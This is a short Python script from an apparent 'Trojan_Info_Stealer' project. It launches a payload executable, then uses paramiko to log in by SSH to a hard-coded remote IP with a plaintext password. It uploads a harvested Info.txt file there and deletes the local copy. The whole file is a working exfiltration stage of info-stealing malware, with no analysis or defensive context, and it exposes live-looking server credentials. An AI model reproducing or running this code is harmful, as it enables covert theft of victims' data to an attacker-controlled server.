import os
import time
import paramiko


os.system("E:/Github_Projects/Trojan_Info_Stealer/Pizza.exe") #Running the payload 
time.sleep(15)

#Sending files to remote server

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('52.140.63.55', username='hassan', password='Qwertyfox@01')

# print ("connected successfully!")

sftp = ssh.open_sftp()
sftp.put("E:/Github_Projects/Trojan_Info_Stealer/Info.txt", "/home/hassan/info/info.txt")
sftp.close()
ssh.close()

os.remove('Info.txt')